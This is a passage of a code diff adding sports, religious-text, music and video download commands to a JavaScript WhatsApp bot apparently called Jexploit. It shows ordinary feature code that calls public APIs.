+    await sports.formatStandings('SA', 'Serie A', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'ligue1standings':
+case 'ligue1':
+    await sports.formatStandings('FL1', 'Ligue 1', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'elstandings':
+case 'europaleague':
+    await sports.formatStandings('EL', 'Europa League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'eflstandings':
+case 'championship':
+    await sports.formatStandings('ELC', 'EFL Championship', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'wcstandings':
+case 'worldcup':
+    await sports.formatStandings('WC', 'World Cup', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'eurosstandings':
+    await sports.formatStandings('EUROS', 'Euros', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'fifastandings':
+    await sports.formatStandings('FIFA', 'FIFA World Cup', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+
+// ===== MATCHES COMMANDS =====
+case 'eplmatches':
+case 'plmatches':
+    await sports.formatMatches('PL', 'Premier League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'clmatches':
+case 'championsleaguematches':
+    await sports.formatMatches('CL', 'UEFA Champions League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'laligamatches':
+case 'pdmatches':
+    await sports.formatMatches('PD', 'La Liga', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'bundesligamatches':
+case 'bl1matches':
+    await sports.formatMatches('BL1', 'Bundesliga', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'serieamatches':
+case 'samatches':
+    await sports.formatMatches('SA', 'Serie A', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'ligue1matches':
+case 'fl1matches':
+    await sports.formatMatches('FL1', 'Ligue 1', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'elmatches':
+case 'europaleaguematches':
+    await sports.formatMatches('EL', 'Europa League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'eflmatches':
+case 'elcmatches':
+    await sports.formatMatches('ELC', 'EFL Championship', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'wcmatches':
+case 'worldcupmatches':
+    await sports.formatMatches('WC', 'World Cup', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'euromatches':
+    await sports.formatMatches('EUROS', 'Euros', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'fifamatches':
+    await sports.formatMatches('FIFA', 'FIFA World Cup', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+
+// ===== TOP SCORERS COMMANDS =====
+case 'eplscorers':
+case 'plscorers':
+    await sports.formatTopScorers('PL', 'Premier League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'clscorers':
+case 'championsleaguescorers':
+    await sports.formatTopScorers('CL', 'UEFA Champions League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'laligascorers':
+case 'pdscorers':
+    await sports.formatTopScorers('PD', 'La Liga', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'bundesligascorers':
+case 'bl1scorers':
+    await sports.formatTopScorers('BL1', 'Bundesliga', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'serieascorers':
+case 'sascorers':
+    await sports.formatTopScorers('SA', 'Serie A', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'ligue1scorers':
+case 'fl1scorers':
+    await sports.formatTopScorers('FL1', 'Ligue 1', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'elscorers':
+case 'europaleaguescorers':
+    await sports.formatTopScorers('EL', 'Europa League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'eflscorers':
+case 'elcscorers':
+    await sports.formatTopScorers('ELC', 'EFL Championship', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'wcscorers':
+case 'worldcupscorers':
+    await sports.formatTopScorers('WC', 'World Cup', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'euroscorers':
+    await sports.formatTopScorers('EUROS', 'Euros', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'fifascorers':
+    await sports.formatTopScorers('FIFA', 'FIFA World Cup', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+
+// ===== UPCOMING MATCHES COMMANDS =====
+case 'eplupcoming':
+case 'plupcoming':
+    await sports.formatUpcomingMatches('PL', 'Premier League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'clupcoming':
+case 'championsleagueupcoming':
+    await sports.formatUpcomingMatches('CL', 'UEFA Champions League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'laligaupcoming':
+case 'pdupcoming':
+    await sports.formatUpcomingMatches('PD', 'La Liga', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'bundesligaupcoming':
+case 'bl1upcoming':
+    await sports.formatUpcomingMatches('BL1', 'Bundesliga', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'serieaupcoming':
+case 'saupcoming':
+    await sports.formatUpcomingMatches('SA', 'Serie A', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'ligue1upcoming':
+case 'fl1upcoming':
+    await sports.formatUpcomingMatches('FL1', 'Ligue 1', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'elupcoming':
+case 'europaleagueupcoming':
+    await sports.formatUpcomingMatches('EL', 'Europa League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'eflupcoming':
+case 'elcupcoming':
+    await sports.formatUpcomingMatches('ELC', 'EFL Championship', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'wcupcoming':
+case 'worldcupupcoming':
+    await sports.formatUpcomingMatches('WC', 'World Cup', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'eurosupcoming':
+    await sports.formatUpcomingMatches('EUROS', 'Euros', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'fifaupcoming':
+    await sports.formatUpcomingMatches('FIFA', 'FIFA World Cup', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+
+// ===== SEARCH COMMANDS =====
+case 'teamsearch':
+case 'teaminfo':
+case 'clubinfo':
+    const teamQuery = args.join(' ');
+    await sports.searchTeam(teamQuery, { reply, conn, m });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'playersearch':
+case 'player':
+    const query = args.join(' ');
+    await sports.searchPlayer(query, { reply, conn, m });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+
+case 'venuesearch':
+case 'venue':
+    const venueQuery = args.join(' ');
+    await sports.searchVenue(venueQuery, { reply, conn, m });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+
+// ===== LIVE SCORES =====
+case 'livescores':
+case 'livescore':
+case 'live':
+    await sports.getLiveScores({ reply, conn, m });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+
+// ===== FOOTBALL NEWS =====
+case 'footballnews':
+case 'soccernews':
+case 'fnews':
+    await sports.getFootballNews({ reply, conn, m });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+
+// ===== WRESTLING COMMANDS =====
+case 'wweevents':
+case 'wrestlingevents':
+    await sports.getWrestlingEvents({ reply, conn, m });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'wwenews':
+case 'wrestlingnews':
+    await sports.getWWENews({ reply, conn, m });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'wweschedule':
+case 'wrestlingschedule':
+    await sports.getWWESchedule({ reply, conn, m });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+// ===== BETTING COMMANDS =====
+case "betting":
+case "betodds":
+    await sports.formatBettingOdds({ reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+
+// ===== LIVE HIGHLIGHTS =====
+case 'highlights':
+case 'livehighlights':
+case 'matchhighlights':
+    await sports.getLiveScoreHighlights({ reply, conn, m });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+
+// ===== HEAD-TO-HEAD (aliases) =====
+case 'vs':
+case 'headtohead':
+case 'h2h':
+case 'eventsearch': {
+    const vsQuery = args.join(' ');
+    const vsParts = vsQuery.split(/\s+vs\s+/i);
+    if (vsParts.length !== 2 || !vsParts[0].trim() || !vsParts[1].trim()) {
+        await reply(`❌ Please provide two teams separated by "vs". Example: ${prefix}vs Arsenal vs Chelsea`);
+        break;
+    }
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+}
+case 'bible': {
+const BASE_URL = "https://bible-api.com";
+
+    try {
+      // NOTE: bible-api.com needs the space between the book name and the
+      // chapter:verse (e.g. "John 3:16") to tell them apart - it was
+      // previously being stripped out here, which broke every lookup.
+      let chapterInput = text.trim();
+      if (!chapterInput) {
+        return reply(mess.make.usage(prefix + command, "John 3:16"));
+      }
+      let chapterRes = await fetch(`${BASE_URL}/${encodeURIComponent(chapterInput)}`);
+      if (!chapterRes.ok) {
+        return reply(mess.make.error(`Couldn't find *"${chapterInput}"*. Example: ${prefix + command} John 3:16`));
+      }
+      
+      let chapterData = await chapterRes.json();
+      if (!chapterData?.verses?.length) {
+        return reply(mess.make.error(`Couldn't find *"${chapterInput}"*. Example: ${prefix + command} John 3:16`));
+      }
+      let bibleChapter = `
+*The Holy Bible*\n
+*Chapter ${chapterData.reference}*\n
+Type: ${chapterData.translation_name}\n
+Number of verses: ${chapterData.verses.length}\n
+*Chapter Content:*\n
+${chapterData.text}\n`;
+      
+      reply(bibleChapter);
+      await conn.sendMessage(m.chat, { react: { text: '📖', key: m.key } }).catch(() => {});
+    } catch (error) {
+      console.error('Bible API Error:', error.message);
+      reply(mess.error);
+    }
+}
+break
+case "biblelist": {
+try {
+        // Liste des livres de la Bible
+        const bibleList = `
+📜 *Old Testament*:
+1. Genesis
+2. Exodus
+3. Leviticus
+4. Numbers
+5. Deuteronomy
+6. Joshua
+7. Judges
+8. Ruth
+9. 1 Samuel
+10. 2 Samuel
+11. 1 Kings
+12. 2 Kings
+13. 1 Chronicles
+14. 2 Chronicles
+15. Ezra
+16. Nehemiah
+17. Esther
+18. Job
+19. Psalms
+20. Proverbs
+21. Ecclesiastes
+22. Song of Solomon
+23. Isaiah
+24. Jeremiah
+25. Lamentations
+26. Ezekiel
+27. Daniel
+28. Hosea
+29. Joel
+30. Amos
+31. Obadiah
+32. Jonah
+33. Micah
+34. Nahum
+35. Habakkuk
+36. Zephaniah
+37. Haggai
+38. Zechariah
+39. Malachi
+
+📖 *New Testament*:
+1. Matthew
+2. Mark
+3. Luke
+4. John
+5. Acts
+6. Romans
+7. 1 Corinthians
+8. 2 Corinthians
+9. Galatians
+10. Ephesians
+11. Philippians
+12. Colossians
+13. 1 Thessalonians
+14. 2 Thessalonians
+15. 1 Timothy
+16. 2 Timothy
+17. Titus
+18. Philemon
+19. Hebrews
+20. James
+21. 1 Peter
+22. 2 Peter
+23. 1 John
+24. 2 John
+25. 3 John
+26. Jude
+27. Revelation
+
+
+💢 ${global.botname} 💢
+`;
+
+        // Remplacer ce lien par l'URL de l'image que tu m'enverras
+        const imageUrl = "https://files.catbox.moe/ptpl5c.jpeg"; // Remplace "TON_LIEN_IMAGE_ICI" par ton lien d'image
+
+        // Vérifier si le message de la commande est correctement reçu
+        if (!m.chat) {
+            return reply("❌ *An error occurred: Invalid chat.*");
+        }
+
+        // Envoi de la réponse avec l'image et la liste des livres de la Bible
+        await conn.sendMessage(m.chat, {
+            image: { url: imageUrl },
+            caption: `📖 *BIBLE LIST Jexploit*:\n\n` +
+                     `Here is the complete list of books in the Bible:\n\n` +
+                     bibleList.trim() // Ajout du texte des livres de la Bible
+        }, { quoted: mek });
+    } catch (error) {
+        console.error(error);
+        reply(mess.error);
+    }
+}
+break
+case "quran": {
+try {
+            const surahNumber = parseInt(text.trim());
+            
+            if (!text || isNaN(surahNumber)) {
+                await conn.sendMessage(m.chat, { text: "Usage: .quran <surah_number>\nExample: .quran 1" });
+                return;
+            }
+
+            const url = `https://apis.davidcyril.name.ng/quran?surah=${surahNumber}`;
+            const res = await fetch(url);
+            const data = await res.json();
+
+            if (!data.success) {
+                await conn.sendMessage(m.chat, { text: "Could not fetch Surah. Please try another number." });
+                return;
+            }
+
+            const { number, name, type, ayahCount, tafsir, recitation } = data.surah;
+
+            let replyText = `📖 *${name.english}* (${name.arabic})\n`;
+            replyText += `Number: ${number} | Type: ${type} | Ayahs: ${ayahCount}\n\n`;
+            replyText += `Tafsir: ${tafsir.id}`;
+
+            await conn.sendMessage(m.chat, { text: replyText });
+
+            await conn.sendMessage(m.chat, {
+                audio: { url: recitation },
+                mimetype: "audio/mpeg",
+                mp3: true
+            }, { quoted: m });
+
+        } catch (err) {
+            await conn.sendMessage(m.chat, { text: "Error fetching Surah. Try again later." });
+            console.error("Quran command error:", err.message);
+        }
+}
+break
+case 'surahlist':
+case 'listsurah': {
+    await reply('Fetching the list of Surahs... Please wait...');
+    await conn.sendMessage(m.chat, { react: { text: '📖', key: m.key } });
+
+    try {
+        const apiUrl = `${global.api}/surahlist`;
+        const response = await axios.get(apiUrl, { timeout: 15000 });
+
+        if (!response.data?.status || !response.data?.result?.data) {
+            throw new Error('Invalid API response');
+        }
+
+        const surahs = response.data.result.data;
+        let listText = '*List of Surahs (114)*\n\n';
+        surahs.forEach(s => {
+            const num = s.number;
+            const nameEn = s.name.english;
+            const transl = s.name.translation;
+            listText += `${num}. ${nameEn} (${transl})\n`;
+        });
+
+        // Trim trailing newline
+        listText = listText.trim();
+
+        // Send the list
+        await conn.sendMessage(m.chat, {
+            text: listText,
+            contextInfo: {
+                externalAdReply: {
+                    title: `${global.botname} Quran List`,
+                    body: `Powered by Kelvin Tech`,
+                    thumbnail: peler, // Use existing thumbnail
+                    mediaType: 1,
+                    renderLargerThumbnail: false
+                }
+            }
+        }, { quoted: m });
+
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('Surahlist API Error:', error.message);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        reply('❌ Failed to fetch the surah list. Please try again later.');
+    }
+    
+}
+break
+case 'play3': {
+    if (!text) return reply(`Example: ${prefix}play3 kunsi by vyroota`);
+
+    try {
+        await conn.sendMessage(m.chat, {
+            react: { text: '🔍', key: m.key }
+        });
+
+        await fetchMp3(conn, m.chat, m);
+
+    } catch (error) {
+        console.error('Song command error:', error);
+        reply(`❌ Error: ${error.message}`);
+    }
+}
+break
+case 'play2': {
+    await playCommand(conn, m.chat, m, args);
+    
+}
+break
+case "ringtone": {
+    try {
+        const query = args.join(" ");
+        if (!query) {
+            return reply("Please provide a search query! Example: .ringtone Suna");
+        }
+
+        await reply(`🔍 *Searching for "${query}" ringtones...*`);
+
+        // First Priority: Discard API
+        const searchUrl = `https://discardapi.dpdns.org/api/dl/ringtone?apikey=guru&title=${encodeURIComponent(query)}`;
+        const response = await axios.get(searchUrl, { timeout: 30000 });
+        
+        if (response.data?.result && response.data.result.length > 0) {
+            const ringtones = response.data.result;
+            const randomRingtone = ringtones[Math.floor(Math.random() * ringtones.length)];
+            
+            await conn.sendMessage(
+                from,
+                {
+                    audio: { url: randomRingtone.url || randomRingtone.dl_link },
+                    mimetype: "audio/mpeg",
+                    fileName: `${randomRingtone.title || query}.mp3`,
+                },
+                { quoted: m }
+            );
+            return;
+        }
+        
+        // Fallback: Dark Yasiya API
+        const { data } = await axios.get(`https://www.dark-yasiya-api.site/download/ringtone?text=${encodeURIComponent(query)}`, { timeout: 15000 });
+
+        if (!data.status || !data.result || data.result.length === 0) {
+            return reply("No ringtones found for your query. Please try a different keyword.");
+        }
+
+        const randomRingtone = data.result[Math.floor(Math.random() * data.result.length)];
+
+        await conn.sendMessage(
+            from,
+            {
+                audio: { url: randomRingtone.dl_link },
+                mimetype: "audio/mpeg",
+                fileName: `${randomRingtone.title}.mp3`,
+            },
+            { quoted: m }
+        );
+        
+    } catch (error) {
+        console.error("Error in ringtone command:", error);
+        reply("❌ *Error fetching ringtone.*\nPlease try again later.");
+    }
+    
+}
+break
+case 'ytmp3':
+case 'song': {
+    if (!text) return reply('*Please provide a song nameor YouTube URL!*');
+
+    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+
+    try {
+        const audioResult = await fetchMp3DownloadUrl(text);
+
+        if (!audioResult?.url) {
+            throw new Error('No audio URL returned');
+        }
+
+        // Best-effort title lookup for the filename
+        let title = 'audio';
+        try {
+            const search = await yts(text);
+            if (search?.videos?.length) title = search.videos[0].title;
+        } catch (_) {}
+
+        await conn.sendMessage(m.chat, {
+            audio: { url: audioResult.url },
+            mimetype: 'audio/mpeg',
+            fileName: `${title.replace(/[^\w\s]/gi, '')}.mp3`,
+            ptt: false
+        }, { quoted: m });
+
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('song command failed:', error);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        reply(`Error: ${error.message}`);
+    }
+    break;
+}
+case 'playdoc':
+case 'songdoc':
+case 'musicdoc': {
+    if (!text) return reply('*Please provide a song name!*');
+
+    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+
+    try {
+        const audioResult = await fetchMp3DownloadUrl(text);
+
+        if (!audioResult?.url) {
+            throw new Error('No audio URL returned');
+        }
+
+        // Best-effort title lookup for the filename
+        let title = 'audio';
+        try {
+            const search = await yts(text);
+            if (search?.videos?.length) title = search.videos[0].title;
+        } catch (_) {}
+
+        await conn.sendMessage(m.chat, {
+            document: { url: audioResult.url },
+            mimetype: 'audio/mpeg',
+            fileName: `${title.replace(/[^\w\s]/gi, '')}.mp3`,
+            caption: `📄 *${title}*\n\n> ${global.wm || global.botname || 'Bot'}`
+        }, { quoted: m });
+
+        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.error('playdoc command failed:', error);
+        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+        reply(`Error: ${error.message}`);
+    }
+   
+}
+break;
+case "play": {
+    await playCommand2(conn, m.chat, m, args, buttonHandler);
+    break;
+}
+case 'song2': {
+    const query = args.join(" ").trim();
+        if (!query) return reply(`📌 *Example: ${prefix}song2 Sekkle down by bunnie Gunter*`);
+
+        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+
+        try {
+            // NexRay ytplay: takes a search query or URL, returns full metadata + mp3 link
+            const apiUrl = `https://api.nexray.eu.cc/downloader/ytplay?q=${encodeURIComponent(query)}`;
+            const { data } = await axios.get(apiUrl, {
+                timeout: 60000,
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+                }
+            });
+
+            // Validate response shape: { status: true, result: { title, download_url, ... } }
+            if (!data?.status || !data?.result?.download_url) {
+                await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+                return reply(`❌ No results found for "${query}".`);
+            }
+
+            const r = data.result;
+            const audioUrl = r.download_url;
+            const title = r.title || 'YouTube Audio';
+            const thumbnail = r.thumbnail || null;
+            const safeName = title.replace(/[^\w\s]/gi, '').trim() || 'audio';
+
+            // Send thumbnail preview with song details
+            if (thumbnail) {
+                await conn.sendMessage(m.chat, {
+                    image: { url: thumbnail },
+                    caption: `🎵 *${title}*\n\n` +
+                             `⏱ *Duration:* ${r.duration || 'Unknown'}\n` +
+                             `👁 *Views:* ${r.views || 'Unknown'}\n` +
+                             `📺 *Channel:* ${r.channel || 'Unknown'}\n\n` +
+                             `⌛ *Sending audio...*`
+                }, { quoted: m });
+            }
+
+            // Send the audio file
+            await conn.sendMessage(m.chat, {
+                audio: { url: audioUrl },
+                mimetype: 'audio/mpeg',
+                fileName: `${safeName}.mp3`,
+                ptt: false
+            }, { quoted: m });
+
+            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+
+        } catch (error) {
+            console.error('Song2 error:', error.message);
+            await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+            reply(`❌ Error: ${error.message}`);
+        }
+}
+break 
+case "spotify": {
+    if (!text) return reply("🎵 *SPOTIFY DOWNLOADER*\n\n📝 *Example:* .spotify Sekkle down by Beenie Gunter");
+
+    await reply("🔍 *Searching for the song on Spotify...*");
+    await conn.sendMessage(m.chat, { react: { text: "🔍", key: m.key } });
+
+    try {
+        const searchRes = await axios.get(`https://api.nexray.eu.cc/downloader/spotifyplay?q=${encodeURIComponent(text)}`);
+        const searchData = searchRes.data;
+
+        if (!searchData.status || !searchData.result) {
+            return reply("🚫 *Song not found on Spotify.*\n\nPlease check the song name and try again.");
+        }
+
+        const result = searchData.result;
+        const title = result.title;
+        const artist = result.artist;
+        const duration = result.duration;
+        const thumbnail = result.thumbnail;
+        const downloadUrl = result.download_url;
+
+        // Send song info with thumbnail
+        await conn.sendMessage(m.chat, {
+            image: { url: thumbnail },
+            caption: `🎵 *${title}*\n👤 *Artist:* ${artist}\n⏱️ *Duration:* ${duration}\n\n📥 *Downloading audio, please wait...*`
+        }, { quoted: m });
+
+        // Download audio directly
+        const audioRes = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
+        const audioBuffer = Buffer.from(audioRes.data);
+        
+        // Send as audio message (playable in chat)
+        await conn.sendMessage(m.chat, {
+            audio: audioBuffer,
+            mimetype: 'audio/mpeg',
+            fileName: `${title.replace(/[^a-zA-Z0-9]/g, '_')}.mp3`,
+            ptt: false,
+            caption: `✅ *Downloaded successfully!*\n\n🎵 *${title}*\n👤 *${artist}*\n⏱️ *${duration}*\n\n🎧 *Enjoy your music!*`
+        }, { quoted: m });
+
+        // Success reaction
+        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+
+    } catch (error) {
+        console.error('Spotify error:', error);
+        reply("❌ *Error downloading song.*\n\nPlease try again later.");
+        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+    }
+    
+    
+}
+break
+case 'ytmp4': {
+if (!text) return reply('.ytmp4 <YouTube URL>');
+        
+        try {
+            await reply('⏳ Downloading video...');
+            
+            const apiUrl = `${global.api}/download/mp4?url=${encodeURIComponent(text)}`;
+            const res = await axios.get(apiUrl);
+            const data = res.data;
+            
+            if (data.status && data.result) {
+                await conn.sendMessage(m.chat, {
+                    video: { url: data.result },
+                    caption: `📹 *YouTube Video*\n\n${global.wm || ''}`
+                }, { quoted: m });
+            } else {
+                reply('Failed to download video');
+            }
+            
+        } catch (error) {
+            console.error('ytmp4 error:', error);
+            reply('Error: ' + error.message);
+        }
+}
+break
+case 'video2': {
+    if (!text) return reply(`Example: ${prefix}${command} Born to win by fikfamaic`);
+
+    try {
+        await reply(`🔍 Searching for "${text}"...`);
+
+        const { videos } = await yts(text);
+        if (!videos || videos.length === 0) {
+            return reply(`❌ No results found for "${text}"`);
+        }
+
+        const video = videos[0];
+        const videoUrl = video.url;
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '⏳', key: m.key }
+        });
+
+        await reply(`📥 Downloading: ${video.title}`);
+
+        const result = await fetchVideo(videoUrl);
+
+        await conn.sendMessage(m.chat, {
+            video: { url: result.download },
+            mimetype: 'video/mp4',
+            fileName: `${result.title.replace(/[^\w\s]/gi, '')}.mp4`,
+            caption: `🎬 *${result.title}*\n\n> ${global.wm}`
+        }, { quoted: m });
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '✅', key: m.key }
+        });
+
+    } catch (error) {
+        console.error('Video error:', error);
+        reply(`❌ Error: ${error.message}`);
+    }
+}
+break
+case "video": {
+    if (!text) return reply('🎥 *Video Downloader*\n\nPlease provide a song name or YouTube URL!\n\n📝 *Example:* `.video despacito`');
+
+    try {
+        let videoUrl = text;
+        let videoData;
+        let videoTitle = "";
+        let videoThumbnail = "";
+
+        // Searching reaction
+        await conn.sendMessage(m.chat, {
+            react: { text: '🎬', key: m.key }
+        });
+
+        // YouTube URL or search term?
+        if (text.includes('youtube.com/') || text.includes('youtu.be/')) {
+            videoUrl = text;
+            videoData = await fetchVideoDownloadUrl(videoUrl);
+        } else {
+            const search = await yts(text);
+            if (!search || search.all.length === 0) {
+                return reply('❌ *No videos found for your query.*\n\nTry different keywords.');
+            }
+
+            const video = search.all[0];
+            videoUrl = video.url;
+            videoTitle = video.title;
+            videoThumbnail = video.thumbnail;
+            videoData = await fetchVideoDownloadUrl(videoUrl);
+        }
+
+        // fetchVideoDownloadUrl returns { url, quality, title }
+        if (!videoData?.url) throw new Error('No video URL returned');
+
+        const finalTitle = videoData.title || videoTitle || 'Your video';
+        const quality = videoData.quality ? `\n🎬 *Quality:* ${videoData.quality}` : '';
+
+        // Info message with thumbnail (if we have one)
+        if (videoThumbnail) {
+            await conn.sendMessage(m.chat, {
+                image: { url: videoThumbnail },
+                caption: `🎬 *${finalTitle}*${quality}\n\n📥 *Processing video, please wait...*`
+            }, { quoted: m });
+        } else {
+            await conn.sendMessage(m.chat, {
+                text: `🎬 *${finalTitle}*${quality}\n\n📥 *Processing video, please wait...*`
+            }, { quoted: m });
+        }
+
+        // Download + verify it's real playable video
+        const media = await downloadVerifiedMedia(videoData.url, 'video');
+
+        // Send the verified buffer
+        await conn.sendMessage(m.chat, {
+            video: media.buffer,
+            mimetype: media.mime || 'video/mp4',
+            fileName: `${finalTitle.replace(/[^\w\s]/gi, '')}.mp4`,
+            caption: `✅ *Video ready!*\n\n🎬 *${finalTitle}*\n\n🎉 *Enjoy watching!*`
+        }, { quoted: m });
+
+        // Success reaction
+        await conn.sendMessage(m.chat, {
+            react: { text: '✅', key: m.key }
+        });
+
+    } catch (error) {
+        console.error('Video command failed:', error);
+        reply(`❌ *Error fetching video.*\n\nPlease try again later.`);
+
+        await conn.sendMessage(m.chat, {
+            react: { text: '❌', key: m.key }
+        });
+    }
+}
+break;
+case 'checkapikey': {
+    const args = body.trim().split(/\s+/);
+    args.shift();
+    const apiKey = args.join(' ');
+    
+    if (!apiKey) {
+        return reply("Please provide an API key to check.\n\nExample: !checkapikey prince");
+    }
+    
+    try {
+        const apiUrl = `https://api.princetechn.com/checkapikey?apikey=${encodeURIComponent(apiKey)}`;
+        const { data } = await axios.get(apiUrl, { timeout: 10000 });
+        
+        if (data && data.success && data.result) {
+            const result = data.result;
+            const resultText = `API Key Status\n\nKey: ${result.apikey}\nUsername: ${result.username}\nPlan: ${result.plan}\nLimit: ${result.limit}\nUsed: ${result.used}\nRemaining: ${result.remainingLimit}\nRegistered: ${result.registeredDate}\nExpiry: ${result.expiryDate}\n\n${result.customMessage}`;
+            reply(resultText);
+        } else {
+            reply("Failed to check API key status. Please make sure your API key is valid.");
+        }
+    } catch (error) {
+        console.error('CheckAPI error:', error.message);
+        reply("Error checking API key. Please try again later!");
+    }
+    
+}
+break
+case "ytstalk": {
+try {
+    if (!q) {
+      return reply("❌ Please provide a valid YouTube channel username or ID.");
+    }
+
+    await conn.sendMessage(from, {
+      react: { text: "⏳", key: m.key }
+    });
+
+    const apiUrl = `https://delirius-apiofc.vercel.app/tools/ytstalk?channel=${encodeURIComponent(q)}`;
+    const { data } = await axios.get(apiUrl);
+
+    if (!data || !data.status || !data.data) {
+      return reply("⚠️ Failed to fetch YouTube channel details. Ensure the username or ID is correct.");
+    }
+
+    const yt = data.data;
+    const caption = `╭━━━〔 *YOUTUBE STALKER* 〕━━━⊷\n`
+      + `┃👤 *Username:* ${yt.username}\n`
+      + `┃📊 *Subscribers:* ${yt.subscriber_count}\n`
+      + `┃🎥 *Videos:* ${yt.video_count}\n`
+      + `┃🔗 *Channel Link:* (${yt.channel})\n`
+      + `╰━━━⪼\n\n`
+      + `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Jexploit`;
+
+    await conn.sendMessage(from, {
+      image: { url: yt.avatar },
+      caption: caption
+    }, { quoted: m });
+
+  } catch (error) {
+    console.error("Error:", error);
+    reply(mess.error);
+  }
+}
+break
+case "download": {
+if (!text) return reply('Enter download URL');
+    
+    try {
+      let res = await fetch(text, { method: 'GET', redirect: 'follow' });
+      let contentType = res.headers.get('content-type');
+      let buffer = await res.buffer();
+      let extension = contentType.split('/')[1]; 
+      let filename = res.headers.get('content-disposition')?.match(/filename="(.*)"/)?.[1] || `download-${Math.random().toString(36).slice(2, 10)}.${extension}`;
+
+      let mimeType;
+      switch (contentType) {
+        case 'audio/mpeg':
+          mimeType = 'audio/mpeg';
+          break;
+        case 'image/png':
